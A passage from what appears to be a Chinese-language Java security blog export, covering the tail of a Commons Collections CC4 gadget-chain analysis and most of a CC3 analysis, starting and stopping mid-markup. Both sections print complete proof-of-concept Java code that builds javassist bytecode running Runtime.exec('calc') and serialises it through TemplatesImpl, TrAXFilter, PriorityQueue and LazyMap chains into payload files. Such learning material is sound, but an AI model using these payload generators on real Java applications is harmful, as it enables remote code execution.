class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>接着触发点，使用cc3中的触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>最后添加PriorityQueue序列化入口，并通过反射设置满足条件，再根据上述分析，去掉添加元素的步骤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="comment">//设置优先级队列对象</span></span><br><span class="line">PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//设置比较器</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br></pre></td></tr></table></figure><p>最后反序列化</p><p>得到最后代码poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc4payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc4payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/e3ecc659/cc4-6.png" title="实现demo"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>cc4简述就是cc3中触发代码替换cc2中的触发代码，由于触发代码的改变，无需向队列添加元素，使用比较器时自动触发，比较好理解。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC3链学习与分析</title>
      <link href="/posts/a9d24d12.html"/>
      <url>/posts/a9d24d12.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC1、CC2过完，后面的链相对来说就容易理解很多，就是再利用链上变种调用其他类方法进行实现，继续往后面学吧。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（8u71版本之前，8u71之后漏洞已修复）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>CC1、CC2后的链基本就是正向分析，因为在CC1&#x2F;2中的大部分逆向分析思路已经分析过了，后续的链基本就是在前面的链上面交换利用类和方法实现同一个效果。</p><p>先明确的CC3链使用的东西：LazyMap动态代理、javassist字节码、TemplatesImpl字节码转换成类、PriorityQueue优先级队列，相当于把cc1和cc2串起来用了。</p><p>简述CC1、CC2的实现流程</p><p>CC1（LazyMap链）：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将<code>LazyMap</code>对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><p>CC2（TemplatesImpl）：</p><ul><li>通过反射调用<code>InvokerTransformer</code>构造方法传递方法名<code>getOutputProperties/newTransformer</code>。</li><li>通过<code>javassist</code>生成恶意代码的字节码。</li><li>通过<code>TemplatesImpl</code>将字节码转化成类。</li><li>将反射<code>InvokerTransformer</code>对象作为比较器传递入<code>PriorityQueue</code>优先级队列。</li><li>将<code>TemplatesImpl</code>对象元素添加入<code>PriorityQueue</code>队列。</li><li>在比较器进行元素比较时触发<code>TemplatesImpl</code>的<code>getOutputProperties/newTransformer</code>方法，触发漏洞。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先不直接给出cc3的poc，先看下调用变化，尽可能逆向思维分析。</p><p>主体上还是使用了<code>javassist</code>&amp;<code>TemplatesImpl</code>，生成恶意字节码再转化字节码解析成类进行调用，在分析CC2的时候提到调用<code>TemplatesImpl</code>的（<code>getOutputProperties()</code>或者<code>newTransformer()</code>）方法。</p><p>其中<code>getOutputProperties()</code>方法是<code>newTransformer()</code>的本类的上层调用，其中<code>newTransformer()</code>还有其他类的调用在CC2分析中过掉了，再看看其他类的调用情况</p><p><img src="/posts/a9d24d12/cc3-1.png" title="newTransformer调用"></p><p>发现除了cc2利用链的<code>getOutputProperties()</code>方法外，还剩3个方法（<code>TransformerFactoryImpl.newTransformer()</code>、<code>TransformerFactoryImpl.newTransformerHandler()</code>、<code>TrAXFilter.TrAXFilter()</code>）</p><p>其中<code>TransformerFactoryImpl.newTransformer()</code>和<code>TransformerFactoryImpl.newTransformerHandler()</code>方法都是<code>TransformerFactoryImpl</code>类的方法，要调用该两个方法，首先得创建该类的实例，再去调用这两个方法，其次，<code>TransformerFactoryImpl</code>类并未实现序列化接口，该类的实例无法直接进行序列化，只能通过其他类进行调用，向上未发现能形成链的调用类。</p><p><img src="/posts/a9d24d12/cc3-2.png" title="TransformerFactoryImpl"></p><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>剩下还有一个<code>TrAXFilter.TrAXFilter()</code>方法，TrAXFilter()方法是TrAXFilter类的构造方法。</p><p>该类的描述</p><blockquote><p>XMLFilterImpl的骨架扩展</p></blockquote><p><img src="/posts/a9d24d12/cc3-3.png" title="TrAXFilter方法"></p><p>该类通过将<code>Templates</code>对象作为参数传递进构造方法，且没有其他条件，这里进行了强制转换成<code>TransformerImpl</code>类，进而直接调用<code>(TransformerImpl)Templates.newTransformer()</code>方法</p><p>因此通过构造函数带参实例化<code>TrAXFilter</code>类对象，就能执行恶意代码。</p><p>但由于<code>TrAXFilter</code>类并未实现序列化，因此该类无法直接实例化对象并序列化来执行恶意代码，需要找到一个能实例化该类的方法。</p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>到这确实没法通过逆向思维找到对应调用<code>TrAXFilter类</code>的实例化方法，这里就只有正向分析学习一下。</p><p>该类的描述</p><blockquote><p>通过反射创建新对象实例的Transformer实现</p></blockquote><p>其中构造方法传递两个参数，一个<code>class[]</code>类数组的参数，代表参数类型，一个<code>object[]</code>对象类数组的参数，代表参数值</p><p><img src="/posts/a9d24d12/cc3-4.png" title="InstantiateTransformer"></p><p>其中存在transform方法</p><p><img src="/posts/a9d24d12/cc3-5.png" title="transform"></p><p>这里会先判断传入的input对象是否是Class实例，不是的话直接抛出该类不是Class实例的异常异常，所以这里也必须使用反射传递进来。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>随后通过调用input对象的带参构造方法，并传递iArgs对象通过newInstance进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(iArgs);</span><br></pre></td></tr></table></figure><p>这里就利用到cc1链中的<code>ChainedTransformer</code>类的方法把<code>TrAXFilter</code>和<code>InstantiateTransformer</code>串起来，通过<code>TrAXFilter</code>反射对象<code>input</code>参数传递入<code>InstantiateTransformer.transform(input)</code>将<code>TrAXFilter</code>对象进行实例化，调用<code>TrAXFilter</code>构造方法中的<code>TransformerImpl.newTransformer</code>，形成完整的利用链。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>主体没变，依然把cc2中的 <code>javassist</code>生成恶意代码的字节码和<code>TransformerImpl</code>转化字节码为实例类 的代码段搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>恶意字节码以及转化实例的代码有了，接下来就是找到调用，通过<code>TrAXFilter</code>和<code>InstantiateTransformer</code>串联起来作为触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接下来使用CC1中的LazyMap链的后半段通过动态代理调用invoke方法执行<code>transformerChain.transform()</code>作为序列化入口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line"><span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line"><span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line"><span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化触发漏洞。</p><p>最后的POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">        <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">        <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">        InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc3payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(invohandlerproxy);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc3payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/a9d24d12/cc3-7.png" title="执行实现"></p><h2 id="CC3延伸TransformedMap"><a href="#CC3延伸TransformedMap" class="headerlink" 